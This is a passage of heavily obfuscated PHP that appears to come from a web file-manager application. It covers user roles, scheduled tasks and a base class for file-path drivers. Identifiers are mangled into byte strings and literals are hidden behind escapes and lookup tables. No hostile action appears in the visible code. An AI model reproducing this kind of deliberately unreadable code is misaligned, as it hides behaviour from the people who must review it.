findWhereField($Á¬Õ§˜‹) { $¡ú‘œô =& $_SERVER[¡¬ıÜ ƒ]; $…Ûğ¢ßÂ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Á¬Õ§˜‹) || !is_array($Á¬Õ§˜‹[$¡ú‘œô[354]])) { return !1; } foreach ($Á¬Õ§˜‹[$¡ú‘œô[354]] as $Š¶±¾º– => $óÑšÇÇ) { if (is_array($óÑšÇÇ) && isset($óÑšÇÇ[0]) && is_string($óÑšÇÇ[0]) && strtolower($óÑšÇÇ[0]) == $¡ú‘œô[7] && is_array($óÑšÇÇ[1]) && count($óÑšÇÇ[1]) > $…Ûğ¢ßÂ) { ignore_timeout(); return $Š¶±¾º–; } } return !1; } public function setMasterDB($‹ìîÉÛ– = true) { think_config($_SERVER[¡¬ıÜ ƒ][473], $‹ìîÉÛ–); } } goto AĞÖ…ñÜ’ˆ; FªÍ¯Ùø³’: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x72\157\154\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\145", "\141\x75\164\x68", "\154\x61\x62\145\x6c", "\x64\151\x73\160\x6c\141\171", "\x73\171\x73\164\x65\155", "\x64\145\163\143", "\151\147\x6e\x6f\162\x65\105\170\x74", "\x69\x67\156\x6f\x72\145\106\x69\154\x65\123\151\x7a\145", "\x61\x64\155\x69\x6e\151\x73\x74\x72\x61\x74\x6f\x72", "\163\157\162\164"); public function listData($ç“Û¼õÙ = false, $¦äÒœñ… = "\x73\x6f\x72\x74", $ÓÛÂÄ÷¸ = false) { $ÇØİÂŸ¼ =& $_SERVER[¡¬ıÜ ƒ]; $¯±†™†Å = parent::listData($ç“Û¼õÙ, $¦äÒœñ…, $ÓÛÂÄ÷¸); if (!$ç“Û¼õÙ) { foreach ($¯±†™†Å as $¢çôûºÜ => $ëÇƒÔÜï) { if ($ëÇƒÔÜï[$ÇØİÂŸ¼[2194]] == 1) { $¯±†™†Å[$¢çôûºÜ][$ÇØİÂŸ¼[528]] = LNG($ÇØİÂŸ¼[2463]); } } } return $¯±†™†Å; } public function update($áô¶À‚´, $Ñ¦¼×—š) { $ôÜ‚ú¯¹ =& $_SERVER[¡¬ıÜ ƒ]; $¡á”à·Ó = parent::listData($áô¶À‚´); $ÉŠÖ ¤é = $this->findByName($Ñ¦¼×—š[$ôÜ‚ú¯¹[32]]); if (!$¡á”à·Ó || $ÉŠÖ ¤é && $ÉŠÖ ¤é[$ôÜ‚ú¯¹[477]] != $¡á”à·Ó[$ôÜ‚ú¯¹[477]]) { return !1; } if ($ÉŠÖ ¤é[$ôÜ‚ú¯¹[2194]] == 1) { $Ñ¦¼×—š = array($ôÜ‚ú¯¹[32] => $Ñ¦¼×—š[$ôÜ‚ú¯¹[32]], $ôÜ‚ú¯¹[2009] => $Ñ¦¼×—š[$ôÜ‚ú¯¹[2009]]); } $this->filterAuth($Ñ¦¼×—š[$ôÜ‚ú¯¹[489]]); return parent::update($áô¶À‚´, $Ñ¦¼×—š); } public function remove($şí³™š) { $öëîáãğ = parent::listData($şí³™š); if (!$öëîáãğ || $öëîáãğ[$_SERVER[¡¬ıÜ ƒ][191]]) { return !1; } return parent::remove($şí³™š); } public function add($ÃÎ×òÂ) { $©Ú–½á =& $_SERVER[¡¬ıÜ ƒ]; $Øá‡ç¼Ü = $ÃÎ×òÂ[$©Ú–½á[32]]; if ($this->findByName($Øá‡ç¼Ü)) { return !1; } $±–½ùĞ» = array($©Ú–½á[496] => $Øá‡ç¼Ü, $©Ú–½á[1992] => $©Ú–½á[12], $©Ú–½á[1988] => $©Ú–½á[1996], $©Ú–½á[2464] => 1, $©Ú–½á[1991] => 0, $©Ú–½á[2465] => 0, $©Ú–½á[1990] => $this->getSort()); $ÃÎ×òÂ = array_merge($±–½ùĞ», $ÃÎ×òÂ); $this->filterAuth($ÃÎ×òÂ[$©Ú–½á[489]]); return parent::insert($ÃÎ×òÂ); } private function getSort() { $«©•óİ =& $_SERVER[¡¬ıÜ ƒ]; $ß¿øË‰Ş = parent::listData(); $ÈÑé‚ºı = array_to_keyvalue($ß¿øË‰Ş, $«©•óİ[12], $«©•óİ[2010]); return empty($ÈÑé‚ºı) ? 0 : max($ÈÑé‚ºı) + 1; } private function filterAuth(&$ç€éÉ•ğ) { $öİù÷°é =& $_SERVER[¡¬ıÜ ƒ]; $ƒÆÍäŸú = array(); $»ˆÖ¼Ü“ = array_filter(explode($öİù÷°é[50], $ç€éÉ•ğ)); foreach ($»ˆÖ¼Ü“ as $ç€éÉ•ğ) { $óœÂ‹¿† = explode($öİù÷°é[10], $ç€éÉ•ğ); if ($óœÂ‹¿†[0] == $öİù÷°é[2466] && $óœÂ‹¿†[1] != $öİù÷°é[1286]) { $‚ä…ìñ = $óœÂ‹¿†[0] . $öİù÷°é[10] . $óœÂ‹¿†[1] . $öİù÷°é[2467]; if (!in_array($‚ä…ìñ, $»ˆÖ¼Ü“)) { $ƒÆÍäŸú[] = $‚ä…ìñ; } } $ƒÆÍäŸú[] = $ç€éÉ•ğ; } $ç€éÉ•ğ = implode($öİù÷°é[50], $ƒÆÍäŸú); } public function findRoleDefault() { $¢ß·‚õ¯ =& $_SERVER[¡¬ıÜ ƒ]; $ìÙËèÅ‚ = parent::listData(); $©ªê½†Û = !1; foreach ($ìÙËèÅ‚ as $€óÌö§µ) { if (!$€óÌö§µ || $€óÌö§µ[$¢ß·‚õ¯[2008]] == $¢ß·‚õ¯[230] || $€óÌö§µ[$¢ß·‚õ¯[2194]] == 1) { continue; } if (strstr($€óÌö§µ[$¢ß·‚õ¯[489]], $¢ß·‚õ¯[2468])) { continue; } if (!strstr($€óÌö§µ[$¢ß·‚õ¯[489]], $¢ß·‚õ¯[2469])) { continue; } if (!$©ªê½†Û) { $©ªê½†Û = $€óÌö§µ; continue; } $›¼¬£±Ø = explode($¢ß·‚õ¯[50], $©ªê½†Û[$¢ß·‚õ¯[489]]); $ÉÈûÊ½É = explode($¢ß·‚õ¯[50], $€óÌö§µ[$¢ß·‚õ¯[489]]); if (count($›¼¬£±Ø) > count($ÉÈûÊ½É)) { $©ªê½†Û = $€óÌö§µ; } } return $©ªê½†Û ? $©ªê½†Û[$¢ß·‚õ¯[477]] : $¢ß·‚õ¯[12]; } public function sort($Š•Š×à°, $ïÚİøãÆ) { return parent::update($Š•Š×à°, $ïÚİøãÆ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\155\x2e\164\x61\x73\x6b\x4c\x69\163\164"; public $field = array("\156\x61\x6d\145", "\x74\x79\x70\145", "\x65\x76\x65\156\164", "\x74\x69\155\x65", "\x64\145\163\143", "\x73\x79\163\x74\145\x6d", "\145\x6e\x61\142\x6c\145", "\154\141\x73\x74\122\x75\x6e", "\163\157\x72\x74"); public function listData($îœĞÚÓÎ = false, $È€è‚Öı = "\x73\x6f\162\x74", $ûßÕ¤°³ = false) { return parent::listData($îœĞÚÓÎ, $È€è‚Öı, $ûßÕ¤°³); } public function add($¶Ä³éÀ) { $×ÆµñÌÙ =& $_SERVER[¡¬ıÜ ƒ]; $Ü÷ïí¥Õ = $this->findByName($¶Ä³éÀ[$×ÆµñÌÙ[32]]); if ($Ü÷ïí¥Õ) { return !1; } $¶Ä³éÀ[$×ÆµñÌÙ[1735]] = 0; $¶Ä³éÀ[$×ÆµñÌÙ[2010]] = $this->getSort(); return parent::insert($¶Ä³éÀ); } private function getSort() { $ò­Êşğš =& $_SERVER[¡¬ıÜ ƒ]; $öß„¾»¯ = parent::listData(); $ç©™ú˜ = array_to_keyvalue($öß„¾»¯, $ò­Êşğš[12], $ò­Êşğš[2010]); return empty($ç©™ú˜) ? 0 : max($ç©™ú˜) + 1; } public function update($½„ÆË«„, $ˆÄÉŠÓÔ) { $ÎÄ•¾Û· =& $_SERVER[¡¬ıÜ ƒ]; $”ˆÃı½– = $this->listData($½„ÆË«„); $À•Ê¦ùó = $this->findByName($ˆÄÉŠÓÔ[$ÎÄ•¾Û·[32]]); if (!$”ˆÃı½– || $À•Ê¦ùó && $À•Ê¦ùó[$ÎÄ•¾Û·[477]] != $”ˆÃı½–[$ÎÄ•¾Û·[477]]) { return !1; } return parent::update($½„ÆË«„, $ˆÄÉŠÓÔ); } public function remove($ùû±„é¾, $ü©ĞşÎá = false) { $…üîŠİá =& $_SERVER[¡¬ıÜ ƒ]; $ş¤ßÜÔ = $this->listData($ùû±„é¾); if (!$ş¤ßÜÔ) { return; } if (!$ü©ĞşÎá && $ş¤ßÜÔ[$…üîŠİá[191]] == $…üîŠİá[91]) { return !1; } return parent::remove($ùû±„é¾); } public function enable($¯É…ğ´À, $úƒ§¬¨Ø) { return $this->update($¯É…ğ´À, array($_SERVER[¡¬ıÜ ƒ][2458] => $úƒ§¬¨Ø)); } public function run($â§Õøª˜) { return $this->update($â§Õøª˜, array($_SERVER[¡¬ıÜ ƒ][2470] => time())); } } goto A·Ó¾¼Å÷’; F¯ØñÀ®: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ò›ÑÏ«” =& $_SERVER[¡¬ıÜ ƒ]; $this->objectDriver = array($Ò›ÑÏ«”[60], $Ò›ÑÏ«”[61], $Ò›ÑÏ«”[62], $Ò›ÑÏ«”[63], $Ò›ÑÏ«”[64], $Ò›ÑÏ«”[65], $Ò›ÑÏ«”[66], $Ò›ÑÏ«”[67], $Ò›ÑÏ«”[68], $Ò›ÑÏ«”[69], $Ò›ÑÏ«”[70], $Ò›ÑÏ«”[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Çä¶Ñ¦) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Çä¶Ñ¦, $_SERVER[¡¬ıÜ ƒ][8]); } return $Çä¶Ñ¦; } public function iconvApp($¯ œ™ÛÖ) { return $¯ œ™ÛÖ; } public function iconvSystem($”­îÏ) { return $”­îÏ; } public function iconvTo($ãÍ·‰³–, $›€¬²Ÿ, $ÒÀ†‡Äò) { $å½Ç§ ” =& $_SERVER[¡¬ıÜ ƒ]; if (!$ãÍ·‰³– || !function_exists($å½Ç§ ”[72])) { return $ãÍ·‰³–; } static $û¬ÅŠâ• = array(); $£ÃÆš«ì = $›€¬²Ÿ . $å½Ç§ ”[73] . $ÒÀ†‡Äò . $å½Ç§ ”[74] . $ãÍ·‰³–; if (isset($û¬ÅŠâ•[$£ÃÆš«ì])) { return $û¬ÅŠâ•[$£ÃÆš«ì]; } if (function_exists($å½Ç§ ”[75])) { $Ğ÷½Ş¥€ = @mb_convert_encoding($ãÍ·‰³–, $ÒÀ†‡Äò, $›€¬²Ÿ); } else { $Ğ÷½Ş¥€ = @iconv($›€¬²Ÿ, $ÒÀ†‡Äò, $ãÍ·‰³–); } $Ğ÷½Ş¥€ = $Ğ÷½Ş¥€ ? $Ğ÷½Ş¥€ : $ãÍ·‰³–; if (strstr($Ğ÷½Ş¥€, $å½Ç§ ”[76])) { $Ğ÷½Ş¥€ = str_replace($å½Ç§ ”[76], $å½Ç§ ”[11], $Ğ÷½Ş¥€); } $û¬ÅŠâ•[$›€¬²Ÿ . $å½Ç§ ”[73] . $ÒÀ†‡Äò . $å½Ç§ ”[74] . $ãÍ·‰³–] = $Ğ÷½Ş¥€; $û¬ÅŠâ•[$ÒÀ†‡Äò . $å½Ç§ ”[73] . $›€¬²Ÿ . $å½Ç§ ”[74] . $ãÍ·‰³–] = $ãÍ·‰³–; $û¬ÅŠâ•[$ÒÀ†‡Äò . $å½Ç§ ”[73] . $›€¬²Ÿ . $å½Ç§ ”[74] . $Ğ÷½Ş¥€] = $ãÍ·‰³–; $û¬ÅŠâ•[$›€¬²Ÿ . $å½Ç§ ”[73] . $ÒÀ†‡Äò . $å½Ç§ ”[74] . $Ğ÷½Ş¥€] = $Ğ÷½Ş¥€; return $Ğ÷½Ş¥€; } public function getPathInner($ÆÎäØ¨‹) { $»Ëåã¶Ó = IO::init($ÆÎäØ¨‹); return $»Ëåã¶Ó->path; } public function getPathOuter($¿ÜéÈø ) { $¼–±³‰ =& $_SERVER[¡¬ıÜ ƒ]; $‚ş¿¡œ¢ = strlen(trim($this->pathBase, $¼–±³‰[8])); $¿ÜéÈø  = substr(trim($¿ÜéÈø , $¼–±³‰[8]), $‚ş¿¡œ¢); return $this->pathDriver . $¼–±³‰[8] . ltrim($¿ÜéÈø , $¼–±³‰[8]); } public function isParentOf($õÆËÚ£Û, $Ô¡òçşî) { $à›¼±Ãø =& $_SERVER[¡¬ıÜ ƒ]; $õÆËÚ£Û = rtrim(strtolower($õÆËÚ£Û), $à›¼±Ãø[8]) . $à›¼±Ãø[8]; $Ô¡òçşî = rtrim(strtolower($Ô¡òçşî), $à›¼±Ãø[8]) . $à›¼±Ãø[8]; $Ë¶³§‡ã = strpos($Ô¡òçşî, $õÆËÚ£Û) === 0; return $Ë¶³§‡ã; } public function getType() { $è±±ş‡ø =& $_SERVER[¡¬ıÜ ƒ]; $¶›ä”üú = str_replace($è±±ş‡ø[77], $è±±ş‡ø[12], get_class($this)); return strtolower($¶›ä”üú); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($éé¡é½Ñ, $ğŸï–¤ß) { $ñé¯‹¬ =& $_SERVER[¡¬ıÜ ƒ]; $ñŒßÁ· = rtrim($éé¡é½Ñ, $ñé¯‹¬[8]) . $ñé¯‹¬[8] . $ğŸï–¤ß; $†×öÂôø = $this->exist($ñŒßÁ·); return $†×öÂôø ? $ñŒßÁ· : !1; } public function setModifyTime($£·Öşåƒ, $½¸ôİ˜· = '') { } public function renameObject($Ÿğ‘ìÖƒ, $¯‘¶ÁàÀ) { $Ä¯ˆ®ú = $¯‘¶ÁàÀ; $Ÿğ‘ìÖƒ = $this->getPathOuter($Ÿğ‘ìÖƒ); $¯‘¶ÁàÀ = $this->pathFather($Ÿğ‘ìÖƒ) . $¯‘¶ÁàÀ; $Èâı‰İø = IO::copy($Ÿğ‘ìÖƒ, $this->pathFather($Ÿğ‘ìÖƒ), REPEAT_RENAME_FOLDER, $Ä¯ˆ®ú); if ($Èâı‰İø) { IO::remove($Ÿğ‘ìÖƒ); } return $Èâı‰İø ? $¯‘¶ÁàÀ : !1; } public function tempFile($î·Ş¢Î = '', $á¡ó¥Ûâ = '') { if (!$î·Ş¢Î) { $î·Ş¢Î = rand_string(15); } $Ç•‰ÇÖé = TEMP_FILES . rand_string(15) . $_SERVER[¡¬ıÜ ƒ][8]; @mkdir($Ç•‰ÇÖé, DEFAULT_PERRMISSIONS, !0); $ó¥¥÷˜ã = $Ç•‰ÇÖé . $î·Ş¢Î; @touch($ó¥¥÷˜ã); if ($á¡ó¥Ûâ) { file_put_contents($ó¥¥÷˜ã, $á¡ó¥Ûâ); } return $ó¥¥÷˜ã; } public function tempFileRemve($µòóˆŒ) { @unlink($µòóˆŒ); @rmdir($this->pathFather($µòóˆŒ)); } public function mkfile($£„Şáë—, $¹ª‰øŒ½ = '', $ïö˜±ª = REPEAT_RENAME) { } public function mkdir($â–¥Û×Å, $å¶óÛíœ = REPEAT_SKIP) { } public function delFile($Ğ¾œÊ) { } public function delFolder($èÓ¦ÔÙ’) { } public function copyFile($ô³…ÈÄƒ, $ˆÈ™ã—Ò) { } public function moveFile($¿ı³ñÛ, $£ò¬œŸ) { } public function remove($˜çÌÙù”) { if ($this->isFile($˜çÌÙù”)) { return $this->delFile($˜çÌÙù”); } return $this->delFolder($˜çÌÙù”); } public function rename($»Ê—…¶û, $ÚÁ€´ÍÉ) { } public function exist($¨“§Ã‡õ) { } public function findByHash($òß«Î²Ô = '', $ –°×¯ø = '') { return !1; } public function isFile($“ùÑÜñÁ) { } public function isFolder($´¸šÅ»Ç) { } public function size($ïºô¥·) { } public function info($œ¡ÔíÙØ) { } public function infoSimple($Õ÷–œ¯) { return $this->info($Õ÷–œ¯); } public function infoAuth($§ñÛßø) { return $this->info($§ñÛßø); } public function infoFull($ÅÑÙíİÛ) { return $this->info($ÅÑÙíİÛ); } public function infoFullSimple($‹¶¡îû) { return $this->info($‹¶¡îû); } public function infoWithChildren($Öİ¨ÎÔ) { $ıªëµá’ =& $_SERVER[¡¬ıÜ ƒ]; static $ì¡Ã¼ = array(); if (isset($ì¡Ã¼[$Öİ¨ÎÔ])) { return $ì¡Ã¼[$Öİ¨ÎÔ]; } $ò·ñƒÖÕ = $this->info($Öİ¨ÎÔ); if ($ò·ñƒÖÕ && $ò·ñƒÖÕ[$ıªëµá’[33]] == $ıªëµá’[78]) { $™õÉ¯ß = array($ıªëµá’[79] => 0, $ıªëµá’[80] => 0, $ıªëµá’[81] => 0); $this->infoChildren($Öİ¨ÎÔ, $™õÉ¯ß); $ò·ñƒÖÕ[$ıªëµá’[79]] = $™õÉ¯ß[$ıªëµá’[79]]; $ò·ñƒÖÕ[$ıªëµá’[82]] = array($ıªëµá’[83] => $™õÉ¯ß[$ıªëµá’[80]], $ıªëµá’[84] => $™õÉ¯ß[$ıªëµá’[81]]); $ì¡Ã¼[$Öİ¨ÎÔ] = $ò·ñƒÖÕ; } return $ò·ñƒÖÕ; } public function listPath($§ğÅìçş, $Ë¡‚ßì¹ = false) { } public function has($Õ™„¤Œø, $±áÜ—Ï = false, $†œá¤Åè = false) { } public function canRead($»®îÔ‚ä) { } public function canWrite($Ş£öó) { } public function getContent($â°¶¾Å¨) { } public function setContent($âÑ¾×•, $ˆÅ‘üõÆ = '') { } protected function infoChildren($ò½Ñ­±­, &$°«ŞÚé„) { $ùÅûŸíº =& $_SERVER[¡¬ıÜ ƒ]; check_abort_echo(); $Áô®Ì Û = $this->listPath($ò½Ñ­±­, !0); $Áô®Ì Û = array_merge($Áô®Ì Û[$ùÅûŸíº[85]], $Áô®Ì Û[$ùÅûŸíº[86]]); foreach ($Áô®Ì Û as $¹¨¸Øç‚) { if ($¹¨¸Øç‚[$ùÅûŸíº[33]] == $ùÅûŸíº[78]) { $°«ŞÚé„[$ùÅûŸíº[81]]++; $æì³½ÔÎ = $this->getPathInner($¹¨¸Øç‚[$ùÅûŸíº[87]]); $this->infoChildren($æì³½ÔÎ, $°«ŞÚé„); } else { $°«ŞÚé„[$ùÅûŸíº[80]]++; $°«ŞÚé„[$ùÅûŸíº[79]] += $¹¨¸Øç‚[$ùÅûŸíº[79]]; } } } public function fileSubstr($‡İöÖÃ©, $öú»ÅŠÁ, $à÷¨®çÍ) { } public function listAll($×£É¹É›) { } public function listAllMake($ğñşÉ, &$É¥¡ßÄæ) { $·¯€ÍÓ‰ =& $_SERVER[¡¬ıÜ ƒ]; check_abort_echo(); $“‚¼€‹‰ = $this->listPath($ğñşÉ, !0); if (!$“‚¼€‹‰) { return; } $öŠÉÚü½ = array_merge($“‚¼€‹‰[$·¯€ÍÓ‰[85]], $“‚¼€‹‰[$·¯€ÍÓ‰[86]]); foreach ($öŠÉÚü½ as $¶„ú‘î•) { $¸¢Ëñ å = $¶„ú‘î•[$·¯€ÍÓ‰[33]] == $·¯€ÍÓ‰[78]; $¢óšàªÄ = array($·¯€ÍÓ‰[87] => $¶„ú‘î•[$·¯€ÍÓ‰[87]], $·¯€ÍÓ‰[78] => $¸¢Ëñ å); if (isset($¶„ú‘î•[$·¯€ÍÓ‰[79]])) { $¢óšàªÄ[$·¯€ÍÓ‰[79]] = $¶„ú‘î•[$·¯€ÍÓ‰[79]]; } if (isset($¶„ú‘î•[$·¯€ÍÓ‰[88]])) { $¢óšàªÄ[$·¯€ÍÓ‰[88]] = $¶„ú‘î•[$·¯€ÍÓ‰[88]]; } if (!$¸¢Ëñ å) { $É¥¡ßÄæ[] = $¢óšàªÄ; continue; } $É¥¡ßÄæ[] = $¢óšàªÄ; $ßÙÈ¨ğƒ = $¶„ú‘î•[$·¯€ÍÓ‰[87]]; $“Œ¬Ç = $this->pathDriver; if (substr($¶„ú‘î•[$·¯€ÍÓ‰[87]], 0, strlen($“Œ¬Ç)) == $“Œ¬Ç) { $ßÙÈ¨ğƒ = substr($ßÙÈ¨ğƒ, strlen($“Œ¬Ç)); } $this->listAllMake($ßÙÈ¨ğƒ, $É¥¡ßÄæ); } } public function listAllSimple($‚ŸÅùî, $‘ÍâìĞÀ = false) { $ªçÇ¤Õ³ = $this->listAll($‚ŸÅùî); return $this->listAllSimpleMake($ªçÇ¤Õ³, $this->getPathOuter($‚ŸÅùî), $‘ÍâìĞÀ); } public function listAllSimpleMake($§È¦îÔ³, $¼ë Ôì, $Ú¯¹¢²) { $Ù’²ô³¢ =& $_SERVER[¡¬ıÜ ƒ]; $§ÂÛ«®å = array(); $¼ë Ôì = rtrim(get_path_father($¼ë Ôì), $Ù’²ô³¢[8]) . $Ù’²ô³¢[8]; foreach ($§È¦îÔ³ as $¥ÂÄ¼åÒ) { $òô”â¡ = array($Ù’²ô³¢[87] => $¥ÂÄ¼åÒ[$Ù’²ô³¢[87]], $Ù’²ô³¢[89] => $¥ÂÄ¼åÒ[$Ù’²ô³¢[87]], $Ù’²ô³¢[78] => $¥ÂÄ¼åÒ[$Ù’²ô³¢[78]]); if (isset($¥ÂÄ¼åÒ[$Ù’²ô³¢[79]]) && !$¥ÂÄ¼åÒ[$Ù’²ô³¢[78]]) { $òô”â¡[$Ù’²ô³¢[79]] = $¥ÂÄ¼åÒ[$Ù’²ô³¢[79]]; } if (isset($¥ÂÄ¼åÒ[$Ù’²ô³¢[88]])) { $òô”â¡[$Ù’²ô³¢[88]] = $¥ÂÄ¼åÒ[$Ù’²ô³¢[88]]; } if (is_array($¥ÂÄ¼åÒ[$Ù’²ô³¢[90]])) { $òô”â¡[$Ù’²ô³¢[89]] = $¥ÂÄ¼åÒ[$Ù’²ô³¢[90]][$Ù’²ô³¢[87]]; $òô”â¡[$Ù’²ô³¢[79]] = $¥ÂÄ¼åÒ[$Ù’²ô³¢[90]][$Ù’²ô³¢[79]]; $òô”â¡[$Ù’²ô³¢[88]] = $¥ÂÄ¼åÒ[$Ù’²ô³¢[90]][$Ù’²ô³¢[88]]; } else { if (substr($¥ÂÄ¼åÒ[$Ù’²ô³¢[87]], 0, strlen($¼ë Ôì)) == $¼ë Ôì) { $òô”â¡[$Ù’²ô³¢[87]] = substr($¥ÂÄ¼åÒ[$Ù’²ô³¢[87]], strlen($¼ë Ôì)); } } $ÀÛ¿ùˆ¶ = $¥ÂÄ¼åÒ[$Ù’²ô³¢[78]] ? $Ù’²ô³¢[8] : $Ù’²ô³¢[12]; $òô”â¡[$Ù’²ô³¢[89]] = rtrim($òô”â¡[$Ù’²ô³¢[89]], $Ù’²ô³¢[8]) . $ÀÛ¿ùˆ¶; $òô”â¡[$Ù’²ô³¢[87]] = $Ù’²ô³¢[8] . trim($òô”â¡[$Ù’²ô³¢[87]], $Ù’²ô³¢[8]) . $ÀÛ¿ùˆ¶; if (!$Ú¯¹¢²) { $Ş¾€ïÁ¸ = explode($Ù’²ô³¢[8], trim($òô”â¡[$Ù’²ô³¢[87]], $Ù’²ô³¢[8])); $òô”â¡[$Ù’²ô³¢[87]] = $Ù’²ô³¢[8] . implode($Ù’²ô³¢[8], array_slice($Ş¾€ïÁ¸, 1)) . $ÀÛ¿ùˆ¶; } $§ÂÛ«®å[] = $òô”â¡; } return array_sort_by($§ÂÛ«®å, $Ù’²ô³¢[87]); } public function upload($€‘´€Î°, $¥´ñù¨, $ÉÑîõ½Ö = false, $Éİ–£ö = REPEAT_REPLACE) { } public function uploadFileByID($‘ñÌßÖ, $Ã•Ğ„›, $Œ¢Šëöµ) { } public function uploadFileByPath($÷öîÈŒŠ, $Ó°ªüŒ, $ÎÍÏ†×É = array()) { } public function isUploadServer() { $ÔÑ¾÷±¦ =& $_SERVER[¡¬ıÜ ƒ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÔÑ¾÷±¦[91]) { return !0; } return $GLOBALS[$ÔÑ¾÷±¦[6]][$ÔÑ¾÷±¦[92]][$ÔÑ¾÷±¦[93]]; } public function isFileOutServer() { $Åâ‹Åô =& $_SERVER[¡¬ıÜ ƒ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Åâ‹Åô[91]) { return !0; } return $GLOBALS[$Åâ‹Åô[6]][$Åâ‹Åô[92]][$Åâ‹Åô[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($§Ì§¿ç) { $áÂÍ‘¹ı =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->isCdnHost()) { return $§Ì§¿ç; } return str_replace(trim(get_url_root($§Ì§¿ç), $áÂÍ‘¹ı[8]), trim($this->cdnHost, $áÂÍ‘¹ı[8]), $§Ì§¿ç); } public function uploadLink($€ıïïÑ, $¹ŸŸ’´÷ = 0) { $¥Œ§ß½Î =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isUploadServer()) { return; } $”£ûÑ©ê = $this->getType(); if (!in_array($”£ûÑ©ê, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Ùãó¶½ = 1024 * 1024 * 10; $ê°Éº = $¹ŸŸ’´÷ <= $Ùãó¶½ ? $¥Œ§ß½Î[95] : $¥Œ§ß½Î[96]; $İ«ÜÀÎï = (!$¹ŸŸ’´÷ ? 1 : ceil($¹ŸŸ’´÷ / pow(1024, 3))) * 3600 * 4; $ï­°‡ = $this->{$ê°Éº}($€ıïïÑ, $İ«ÜÀÎï); if ($ï­°‡) { $ï­°‡[$¥Œ§ß½Î[97]] = $€ıïïÑ; $ï­°‡[$¥Œ§ß½Î[98]] = $”£ûÑ©ê; } return $ï­°‡; } public function uploadFormData($Øè‘œŞ, $å‚°¦ãö = 3600) { } public function uploadMultiData($”åí«½¼, $®âóÊ‡ü = 3600) { } public function multiUploadFormData($¡©¤±çé, $ÍŠ´Ù–‚ = 3600) { return $this->uploadMultiData($¡©¤±çé, $ÍŠ´Ù–‚); } public function download($˜Ã³ÏÇ, $ïŞ–Šõ) { } public function ext($Ó¸ÑÂêú) { $è¶€ã¤è =& $_SERVER[¡¬ıÜ ƒ]; if (strpos($Ó¸ÑÂêú, $è¶€ã¤è[8]) === -1) { $äÀæİ³ü = $Ó¸ÑÂêú; } else { $äÀæİ³ü = $this->pathThis($Ó¸ÑÂêú); } $ş”ú·«“ = $è¶€ã¤è[12]; if (strstr($äÀæİ³ü, $è¶€ã¤è[10])) { $ş”ú·«“ = substr($äÀæİ³ü, strrpos($äÀæİ³ü, $è¶€ã¤è[10]) + 1); $ş”ú·«“ = strtolower($ş”ú·«“); } if (strlen($ş”ú·«“) > 3 && preg_match($è¶€ã¤è[99], $ş”ú·«“, $”Œ¸¯»ä)) { $ş”ú·«“ = $è¶€ã¤è[12]; } return $ş”ú·«“; } public function pathThis($ŞÀ¹‰¿à) { $ˆ“¢õÎÎ =& $_SERVER[¡¬ıÜ ƒ]; $ŞÀ¹‰¿à = str_replace($ˆ“¢õÎÎ[100], $ˆ“¢õÎÎ[8], rtrim($ŞÀ¹‰¿à, $ˆ“¢õÎÎ[8])); $ğ¯†šù¤ = strrpos($ŞÀ¹‰¿à, $ˆ“¢õÎÎ[8]); if ($ğ¯†šù¤ === !1) { return $ŞÀ¹‰¿à; } return substr($ŞÀ¹‰¿à, $ğ¯†šù¤ + 1); } public function pathFather($Ø•Şöñ) { $ŞÛïâ  =& $_SERVER[¡¬ıÜ ƒ]; $Ø•Şöñ = str_replace($ŞÛïâ [100], $ŞÛïâ [8], rtrim($Ø•Şöñ, $ŞÛïâ [8])); $˜ğöÑä = strrpos($Ø•Şöñ, $ŞÛïâ [8]); if ($˜ğöÑä === !1) { return $ŞÛïâ [12]; } return substr($Ø•Şöñ, 0, $˜ğöÑä + 1); } public function hashSimple($ˆ¼™ŠóÔ) { $Œ¡¬™¸ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ˆ¼™ŠóÔ) { return md5($Œ¡¬™¸[12]); } $âêøËØ = $this->size($ˆ¼™ŠóÔ); $¸œøïã = 200; $İÖñóè» = 50; if ($âêøËØ <= $¸œøïã * $İÖñóè») { return $this->hashMd5($ˆ¼™ŠóÔ) . $âêøËØ; } $·•—‚Íê = intval($âêøËØ / $İÖñóè»); $¯„ÂöÇ = $Œ¡¬™¸[12]; for ($—ÓŒ™·ë = 0; $—ÓŒ™·ë < $İÖñóè»; $—ÓŒ™·ë++) { $¯„ÂöÇ .= $this->fileSubstr($ˆ¼™ŠóÔ, $·•—‚Íê * $—ÓŒ™·ë, $¸œøïã); } $¯„ÂöÇ .= $this->fileSubstr($ˆ¼™ŠóÔ, $âêøËØ - $¸œøïã, $¸œøïã); return md5($¯„ÂöÇ) . $âêøËØ; } public static $md5Cache = array(); public function hashMd5($ÎüÛ›¶£) { if (!$ÎüÛ›¶£) { return md5($_SERVER[¡¬ıÜ ƒ][12]); } $ÎüÛ›¶£ = $this->iconvSystem($ÎüÛ›¶£); if (isset(self::$md5Cache[$ÎüÛ›¶£])) { return self::$md5Cache[$ÎüÛ›¶£]; } self::$md5Cache[$ÎüÛ›¶£] = $this->hashMd5Shell($ÎüÛ›¶£); if (!self::$md5Cache[$ÎüÛ›¶£]) { self::$md5Cache[$ÎüÛ›¶£] = @md5_file($ÎüÛ›¶£); } return self::$md5Cache[$ÎüÛ›¶£]; } private function hashMd5Shell($ºÉü­Ş¶) { $Š­ÏŒ˜ó =& $_SERVER[¡¬ıÜ ƒ]; if (!$ºÉü­Ş¶) { return md5($Š­ÏŒ˜ó[12]); } if (!function_exists($Š­ÏŒ˜ó[101])) { return !1; } $ùÛôÑö‹ = array($Š­ÏŒ˜ó[102], 